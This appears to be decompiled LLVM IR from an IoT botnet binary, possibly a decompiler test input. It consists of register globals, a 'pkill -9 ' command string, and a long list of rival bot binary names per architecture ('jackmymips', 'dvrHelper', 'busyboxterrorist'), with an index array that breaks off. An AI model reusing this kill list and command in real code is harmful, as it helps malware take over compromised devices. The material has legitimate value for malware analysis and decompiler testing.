source_filename = "test"
target datalayout = "e-m:e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%sigcontext = type { i32 }

@df = internal unnamed_addr global i1 false
@of = internal unnamed_addr global i1 false
@st0 = internal unnamed_addr global x86_fp80 0xK00000000000000000000
@fpu_stat_TOP = internal unnamed_addr global i3 0
@eax = internal unnamed_addr global i32 0
@ecx = internal unnamed_addr global i32 0
@edx = internal unnamed_addr global i32 0
@ebx = internal unnamed_addr global i32 0
@esp = internal unnamed_addr global i32 0
@ebp = internal unnamed_addr global i32 0
@esi = internal unnamed_addr global i32 0
@edi = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_8056080.12 = global i32 0
@global_var_80560a4.13 = local_unnamed_addr global i32* @global_var_8056080.12
@global_var_8056084.16 = local_unnamed_addr global i32 0
@global_var_80542d4.17 = constant [10 x i8] c"pkill -9 \00"
@global_var_8053b60.18 = constant [5 x i8] c"mips\00"
@global_var_8053b65.19 = constant [7 x i8] c"mips64\00"
@global_var_8053b6c.20 = constant [7 x i8] c"mipsel\00"
@global_var_8053b73.21 = constant [6 x i8] c"sh2eb\00"
@global_var_8053b79.22 = constant [7 x i8] c"sh2elf\00"
@global_var_8053b80.23 = constant [4 x i8] c"sh4\00"
@global_var_8053b84.24 = constant [4 x i8] c"x86\00"
@global_var_8053b88.25 = constant [4 x i8] c"arm\00"
@global_var_8053b8c.26 = constant [6 x i8] c"armv5\00"
@global_var_8053b92.27 = constant [8 x i8] c"armv4tl\00"
@global_var_8053b9a.28 = constant [6 x i8] c"armv4\00"
@global_var_8053ba0.29 = constant [6 x i8] c"armv6\00"
@global_var_8053ba6.30 = constant [5 x i8] c"i686\00"
@global_var_8053bab.31 = constant [8 x i8] c"powerpc\00"
@global_var_8053bb3.32 = constant [13 x i8] c"powerpc440fp\00"
@global_var_8053bc0.33 = constant [5 x i8] c"i586\00"
@global_var_8053bc5.34 = constant [5 x i8] c"m68k\00"
@global_var_8053bca.35 = constant [6 x i8] c"sparc\00"
@global_var_8053bd0.36 = constant [7 x i8] c"x86_64\00"
@global_var_8053bd7.37 = constant [11 x i8] c"jackmymips\00"
@global_var_8053be2.38 = constant [13 x i8] c"jackmymips64\00"
@global_var_8053bef.39 = constant [13 x i8] c"jackmymipsel\00"
@global_var_8053bfc.40 = constant [12 x i8] c"jackmysh2eb\00"
@global_var_8053c08.41 = constant [13 x i8] c"jackmysh2elf\00"
@global_var_8053c15.42 = constant [10 x i8] c"jackmysh4\00"
@global_var_8053c1f.43 = constant [10 x i8] c"jackmyx86\00"
@global_var_8053c29.44 = constant [12 x i8] c"jackmyarmv5\00"
@global_var_8053c35.45 = constant [14 x i8] c"jackmyarmv4tl\00"
@global_var_8053c43.46 = constant [12 x i8] c"jackmyarmv4\00"
@global_var_8053c4f.47 = constant [12 x i8] c"jackmyarmv6\00"
@global_var_8053c5b.48 = constant [11 x i8] c"jackmyi686\00"
@global_var_8053c66.49 = constant [14 x i8] c"jackmypowerpc\00"
@global_var_8053c74.50 = constant [19 x i8] c"jackmypowerpc440fp\00"
@global_var_8053c87.51 = constant [11 x i8] c"jackmyi586\00"
@global_var_8053c92.52 = constant [11 x i8] c"jackmym68k\00"
@global_var_8053c9d.53 = constant [12 x i8] c"jackmysparc\00"
@global_var_8053ca9.54 = constant [13 x i8] c"jackmyx86_64\00"
@global_var_8053cb6.55 = constant [11 x i8] c"hackmymips\00"
@global_var_8053cc1.56 = constant [13 x i8] c"hackmymips64\00"
@global_var_8053cce.57 = constant [13 x i8] c"hackmymipsel\00"
@global_var_8053cdb.58 = constant [12 x i8] c"hackmysh2eb\00"
@global_var_8053ce7.59 = constant [13 x i8] c"hackmysh2elf\00"
@global_var_8053cf4.60 = constant [10 x i8] c"hackmysh4\00"
@global_var_8053cfe.61 = constant [10 x i8] c"hackmyx86\00"
@global_var_8053d08.62 = constant [12 x i8] c"hackmyarmv5\00"
@global_var_8053d14.63 = constant [14 x i8] c"hackmyarmv4tl\00"
@global_var_8053d22.64 = constant [12 x i8] c"hackmyarmv4\00"
@global_var_8053d2e.65 = constant [12 x i8] c"hackmyarmv6\00"
@global_var_8053d3a.66 = constant [11 x i8] c"hackmyi686\00"
@global_var_8053d45.67 = constant [14 x i8] c"hackmypowerpc\00"
@global_var_8053d53.68 = constant [19 x i8] c"hackmypowerpc440fp\00"
@global_var_8053d66.69 = constant [11 x i8] c"hackmyi586\00"
@global_var_8053d71.70 = constant [11 x i8] c"hackmym68k\00"
@global_var_8053d7c.71 = constant [12 x i8] c"hackmysparc\00"
@global_var_8053d88.72 = constant [13 x i8] c"hackmyx86_64\00"
@global_var_8053d95.73 = constant [3 x i8] c"b1\00"
@global_var_8053d98.74 = constant [3 x i8] c"b2\00"
@global_var_8053d9b.75 = constant [3 x i8] c"b3\00"
@global_var_8053d9e.76 = constant [3 x i8] c"b4\00"
@global_var_8053da1.77 = constant [3 x i8] c"b5\00"
@global_var_8053da4.78 = constant [3 x i8] c"b6\00"
@global_var_8053da7.79 = constant [3 x i8] c"b7\00"
@global_var_8053daa.80 = constant [3 x i8] c"b8\00"
@global_var_8053dad.81 = constant [3 x i8] c"b9\00"
@global_var_8053db0.82 = constant [4 x i8] c"b10\00"
@global_var_8053db4.83 = constant [4 x i8] c"b11\00"
@global_var_8053db8.84 = constant [4 x i8] c"b12\00"
@global_var_8053dbc.85 = constant [4 x i8] c"b13\00"
@global_var_8053dc0.86 = constant [4 x i8] c"b14\00"
@global_var_8053dc4.87 = constant [4 x i8] c"b15\00"
@global_var_8053dc8.88 = constant [4 x i8] c"b16\00"
@global_var_8053dcc.89 = constant [4 x i8] c"b17\00"
@global_var_8053dd0.90 = constant [4 x i8] c"b18\00"
@global_var_8053dd4.91 = constant [4 x i8] c"b19\00"
@global_var_8053dd8.92 = constant [4 x i8] c"b20\00"
@global_var_8053ddc.93 = constant [17 x i8] c"busyboxterrorist\00"
@global_var_8053ded.94 = constant [9 x i8] c"DFhxdhdf\00"
@global_var_8053df6.95 = constant [10 x i8] c"dvrHelper\00"
@global_var_8053e00.96 = constant [8 x i8] c"FDFDHFC\00"
@global_var_8053e08.97 = constant [5 x i8] c"FEUB\00"
@global_var_8053e0d.98 = constant [9 x i8] c"FTUdftui\00"
@global_var_8053e16.99 = constant [9 x i8] c"GHfjfgvj\00"
@global_var_8053e1f.100 = constant [6 x i8] c"jhUOH\00"
@global_var_8053e25.101 = constant [9 x i8] c"JIPJIPJj\00"
@global_var_8053e2e.102 = constant [10 x i8] c"JIPJuipjh\00"
@global_var_8053e38.103 = constant [8 x i8] c"kmymips\00"
@global_var_8053e40.104 = constant [10 x i8] c"kmymips64\00"
@global_var_8053e4a.105 = constant [10 x i8] c"kmymipsel\00"
@global_var_8053e54.106 = constant [9 x i8] c"kmysh2eb\00"
@global_var_8053e5d.107 = constant [10 x i8] c"kmysh2elf\00"
@global_var_8053e67.108 = constant [7 x i8] c"kmysh4\00"
@global_var_8053e6e.109 = constant [7 x i8] c"kmyx86\00"
@global_var_8053e75.110 = constant [9 x i8] c"kmyarmv5\00"
@global_var_8053e7e.111 = constant [11 x i8] c"kmyarmv4tl\00"
@global_var_8053e89.112 = constant [9 x i8] c"kmyarmv4\00"
@global_var_8053e92.113 = constant [9 x i8] c"kmyarmv6\00"
@global_var_8053e9b.114 = constant [8 x i8] c"kmyi686\00"
@global_var_8053ea3.115 = constant [11 x i8] c"kmypowerpc\00"
@global_var_8053eae.116 = constant [16 x i8] c"kmypowerpc440fp\00"
@global_var_8053ebe.117 = constant [8 x i8] c"kmyi586\00"
@global_var_8053ec6.118 = constant [8 x i8] c"kmym68k\00"
@global_var_8053ece.119 = constant [9 x i8] c"kmysparc\00"
@global_var_8053ed7.120 = constant [10 x i8] c"kmyx86_64\00"
@global_var_8053ee1.121 = constant [8 x i8] c"lolmips\00"
@global_var_8053ee9.122 = constant [10 x i8] c"lolmips64\00"
@global_var_8053ef3.123 = constant [10 x i8] c"lolmipsel\00"
@global_var_8053efd.124 = constant [9 x i8] c"lolsh2eb\00"
@global_var_8053f06.125 = constant [10 x i8] c"lolsh2elf\00"
@global_var_8053f10.126 = constant [7 x i8] c"lolsh4\00"
@global_var_8053f17.127 = constant [7 x i8] c"lolx86\00"
@global_var_8053f1e.128 = constant [9 x i8] c"lolarmv5\00"
@global_var_8053f27.129 = constant [11 x i8] c"lolarmv4tl\00"
@global_var_8053f32.130 = constant [9 x i8] c"lolarmv4\00"
@global_var_8053f3b.131 = constant [9 x i8] c"lolarmv6\00"
@global_var_8053f44.132 = constant [8 x i8] c"loli686\00"
@global_var_8053f4c.133 = constant [11 x i8] c"lolpowerpc\00"
@global_var_8053f57.134 = constant [16 x i8] c"lolpowerpc440fp\00"
@global_var_8053f67.135 = constant [8 x i8] c"loli586\00"
@global_var_8053f6f.136 = constant [8 x i8] c"lolm68k\00"
@global_var_8053f77.137 = constant [9 x i8] c"lolsparc\00"
@global_var_8053f80.138 = constant [8 x i8] c"RYrydry\00"
@global_var_8053f88.139 = constant [8 x i8] c"telmips\00"
@global_var_8053f90.140 = constant [10 x i8] c"telmips64\00"
@global_var_8053f9a.141 = constant [10 x i8] c"telmipsel\00"
@global_var_8053fa4.142 = constant [9 x i8] c"telsh2eb\00"
@global_var_8053fad.143 = constant [10 x i8] c"telsh2elf\00"
@global_var_8053fb7.144 = constant [7 x i8] c"telsh4\00"
@global_var_8053fbe.145 = constant [7 x i8] c"telx86\00"
@global_var_8053fc5.146 = constant [9 x i8] c"telarmv5\00"
@global_var_8053fce.147 = constant [11 x i8] c"telarmv4tl\00"
@global_var_8053fd9.148 = constant [9 x i8] c"telarmv4\00"
@global_var_8053fe2.149 = constant [9 x i8] c"telarmv6\00"
@global_var_8053feb.150 = constant [8 x i8] c"teli686\00"
@global_var_8053ff3.151 = constant [11 x i8] c"telpowerpc\00"
@global_var_8053ffe.152 = constant [16 x i8] c"telpowerpc440fp\00"
@global_var_805400e.153 = constant [8 x i8] c"teli586\00"
@global_var_8054016.154 = constant [8 x i8] c"telm68k\00"
@global_var_805401e.155 = constant [9 x i8] c"telsparc\00"
@global_var_8054027.156 = constant [10 x i8] c"telx86_64\00"
@global_var_8054031.157 = constant [12 x i8] c"TwoFacemips\00"
@global_var_805403d.158 = constant [14 x i8] c"TwoFacemips64\00"
@global_var_805404b.159 = constant [14 x i8] c"TwoFacemipsel\00"
@global_var_8054059.160 = constant [13 x i8] c"TwoFacesh2eb\00"
@global_var_8054066.161 = constant [14 x i8] c"TwoFacesh2elf\00"
@global_var_8054074.162 = constant [11 x i8] c"TwoFacesh4\00"
@global_var_805407f.163 = constant [11 x i8] c"TwoFacex86\00"
@global_var_805408a.164 = constant [13 x i8] c"TwoFacearmv5\00"
@global_var_8054097.165 = constant [15 x i8] c"TwoFacearmv4tl\00"
@global_var_80540a6.166 = constant [13 x i8] c"TwoFacearmv4\00"
@global_var_80540b3.167 = constant [13 x i8] c"TwoFacearmv6\00"
@global_var_80540c0.168 = constant [12 x i8] c"TwoFacei686\00"
@global_var_80540cc.169 = constant [15 x i8] c"TwoFacepowerpc\00"
@global_var_80540db.170 = constant [20 x i8] c"TwoFacepowerpc440fp\00"
@global_var_80540ef.171 = constant [12 x i8] c"TwoFacei586\00"
@global_var_80540fb.172 = constant [12 x i8] c"TwoFacem68k\00"
@global_var_8054107.173 = constant [13 x i8] c"TwoFacesparc\00"
@global_var_8054114.174 = constant [14 x i8] c"TwoFacex86_64\00"
@global_var_8054122.175 = constant [9 x i8] c"UYyuyioy\00"
@global_var_805412b.176 = constant [9 x i8] c"XDzdfxzf\00"
@global_var_8054134.177 = constant [5 x i8] c"xxb1\00"
@global_var_8054139.178 = constant [5 x i8] c"xxb2\00"
@global_var_805413e.179 = constant [5 x i8] c"xxb3\00"
@global_var_8054143.180 = constant [5 x i8] c"xxb4\00"
@global_var_8054148.181 = constant [5 x i8] c"xxb5\00"
@global_var_805414d.182 = constant [5 x i8] c"xxb6\00"
@global_var_8054152.183 = constant [5 x i8] c"xxb7\00"
@global_var_8054157.184 = constant [5 x i8] c"xxb8\00"
@global_var_805415c.185 = constant [5 x i8] c"xxb9\00"
@global_var_8054161.186 = constant [6 x i8] c"xxb10\00"
@global_var_8054167.187 = constant [6 x i8] c"xxb11\00"
@global_var_805416d.188 = constant [6 x i8] c"xxb12\00"
@global_var_8054173.189 = constant [6 x i8] c"xxb13\00"
@global_var_8054179.190 = constant [6 x i8] c"xxb14\00"
@global_var_805417f.191 = constant [6 x i8] c"xxb15\00"
@global_var_8054185.192 = constant [6 x i8] c"xxb16\00"
@global_var_805418b.193 = constant [6 x i8] c"xxb17\00"
@global_var_8054191.194 = constant [6 x i8] c"xxb18\00"
@global_var_8054197.195 = constant [6 x i8] c"xxb19\00"
@global_var_805419d.196 = constant [6 x i8] c"xxb20\00"
@global_var_80541a3.197 = constant i32 3276849
@global_var_80541a5.198 = constant i32 3342386
@global_var_80541a7.199 = constant i32 3407923
@global_var_80541a9.200 = constant i32 3473460
@global_var_80541ab.201 = constant i32 3538997
@global_var_80541ad.202 = constant i32 3604534
@global_var_80541af.203 = constant i32 3670071
@global_var_80541b1.204 = constant i32 3735608
@global_var_80541b3.205 = constant i32 808517689
@global_var_80541b5.206 = constant [3 x i8] c"10\00"
@global_var_80541b8.207 = constant [3 x i8] c"11\00"
@global_var_80541bb.208 = constant [3 x i8] c"12\00"
@global_var_80541be.209 = constant [3 x i8] c"13\00"
@global_var_80541c1.210 = constant [3 x i8] c"14\00"
@global_var_80541c4.211 = constant [3 x i8] c"15\00"
@global_var_80541c7.212 = constant [3 x i8] c"16\00"
@global_var_80541ca.213 = constant [3 x i8] c"17\00"
@global_var_80541cd.214 = constant [3 x i8] c"18\00"
@global_var_80541d0.215 = constant [3 x i8] c"19\00"
@global_var_80541d3.216 = constant [3 x i8] c"20\00"
@global_var_80541d6.217 = constant [3 x i8] c"bb\00"
@global_var_80541d9.218 = constant [11 x i8] c"busybotnet\00"
@global_var_80541e4.219 = constant [5 x i8] c"pppd\00"
@global_var_80541e9.220 = constant [6 x i8] c"pppoe\00"
@global_var_80541ef.221 = constant [5 x i8] c"wput\00"
@global_var_80541f4.222 = constant [3 x i8] c"B1\00"
@global_var_80541f7.223 = constant [3 x i8] c"B2\00"
@global_var_80541fa.224 = constant [3 x i8] c"B3\00"
@global_var_80541fd.225 = constant [3 x i8] c"B4\00"
@global_var_8054200.226 = constant [3 x i8] c"B5\00"
@global_var_8054203.227 = constant [3 x i8] c"B6\00"
@global_var_8054206.228 = constant [3 x i8] c"B7\00"
@global_var_8054209.229 = constant [3 x i8] c"B8\00"
@global_var_805420c.230 = constant [3 x i8] c"B9\00"
@global_var_805420f.231 = constant [4 x i8] c"B10\00"
@global_var_8054213.232 = constant [4 x i8] c"B11\00"
@global_var_8054217.233 = constant [4 x i8] c"B12\00"
@global_var_805421b.234 = constant [4 x i8] c"B13\00"
@global_var_805421f.235 = constant [4 x i8] c"B14\00"
@global_var_8054223.236 = constant [4 x i8] c"B15\00"
@global_var_8054227.237 = constant [4 x i8] c"B16\00"
@global_var_805422b.238 = constant [4 x i8] c"B17\00"
@global_var_805422f.239 = constant [4 x i8] c"B18\00"
@global_var_8054233.240 = constant [9 x i8] c"B20hackz\00"
@global_var_805423c.241 = constant [5 x i8] c"bin*\00"
@global_var_8054241.242 = constant [5 x i8] c"gtop\00"
@global_var_8054246.243 = constant [5 x i8] c"ftp*\00"
@global_var_805424b.244 = constant [6 x i8] c"tftp*\00"
@global_var_8054251.245 = constant [7 x i8] c"botnet\00"
@global_var_8054258.246 = constant [8 x i8] c"swatnet\00"
@global_var_8054260.247 = constant [8 x i8] c"ballpit\00"
@global_var_8054268.248 = constant [8 x i8] c"fucknet\00"
@global_var_8054270.249 = constant [9 x i8] c"cracknet\00"
@global_var_8054279.250 = constant [8 x i8] c"weednet\00"
@global_var_8054281.251 = constant [7 x i8] c"gaynet\00"
@global_var_8054288.252 = constant [9 x i8] c"queernet\00"
@global_var_8054291.253 = constant [8 x i8] c"ballnet\00"
@global_var_8054299.254 = constant [5 x i8] c"unet\00"
@global_var_805429e.255 = constant [7 x i8] c"yougay\00"
@global_var_80542a5.256 = constant [7 x i8] c"sttftp\00"
@global_var_80542ac.257 = constant [7 x i8] c"sstftp\00"
@global_var_80542b3.258 = constant [7 x i8] c"sbtftp\00"
@global_var_80542ba.259 = constant [6 x i8] c"btftp\00"
@global_var_80542c0.260 = constant [9 x i8] c"y0u1sg3y\00"
@global_var_80542c9.261 = constant [6 x i8] c"bruv*\00"
@global_var_80542cf.262 = constant [5 x i8] c"IoT*\00"
@global_var_80560c0.263 = global [246 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8053b60.18, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8053b65.19, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8053b6c.20, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8053b73.21, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8053b79.22, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8053b80.23, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8053b84.24, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8053b88.25, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8053b8c.26, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8053b92.27, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8053b9a.28, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8053ba0.29, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8053ba6.30, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8053bab.31, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8053bb3.32, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8053bc0.33, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8053bc5.34, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8053bca.35, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8053bd0.36, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8053bd7.37, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8053be2.38, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8053bef.39, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8053bfc.40, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8053c08.41, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8053c15.42, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8053c1f.43, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8053c29.44, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8053c35.45, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8053c43.46, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8053c4f.47, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8053c5b.48, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8053c66.49, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_8053c74.50, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8053c87.51, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8053c92.52, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8053c9d.53, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8053ca9.54, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8053cb6.55, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8053cc1.56, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8053cce.57, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8053cdb.58, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8053ce7.59, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8053cf4.60, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8053cfe.61, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8053d08.62, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8053d14.63, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8053d22.64, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8053d2e.65, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8053d3a.66, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8053d45.67, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_8053d53.68, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8053d66.69, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8053d71.70, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8053d7c.71, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8053d88.72, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8053d95.73, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8053d98.74, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8053d9b.75, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8053d9e.76, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8053da1.77, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8053da4.78, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8053da7.79, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8053daa.80, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8053dad.81, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8053db0.82, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8053db4.83, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8053db8.84, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8053dbc.85, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8053dc0.86, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8053dc4.87, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8053dc8.88, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8053dcc.89, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8053dd0.90, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8053dd4.91, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8053dd8.92, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_8053ddc.93, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8053ded.94, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8053df6.95, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8053e00.96, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8053e08.97, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8053e0d.98, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8053e16.99, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8053e1f.100, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8053e25.101, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8053e2e.102, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8053e38.103, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8053e40.104, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8053e4a.105, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8053e54.106, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8053e5d.107, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8053e67.108, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8053e6e.109, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8053e75.110, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8053e7e.111, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8053e89.112, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8053e92.113, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8053e9b.114, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8053ea3.115, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_8053eae.116, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8053ebe.117, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8053ec6.118, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8053ece.119, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8053ed7.120, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8053ee1.121, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8053ee9.122, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8053ef3.123, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8053efd.124, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8053f06.125, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8053f10.126, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8053f17.127, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8053f1e.128, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8053f27.129, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8053f32.130, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8053f3b.131, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8053f44.132, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8053f4c.133, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_8053f57.134, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8053f67.135, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8053f6f.136, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8053f77.137, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8053f80.138, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8053f88.139, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8053f90.140, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8053f9a.141, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8053fa4.142, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8053fad.143, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8053fb7.144, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8053fbe.145, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8053fc5.146, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8053fce.147, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* 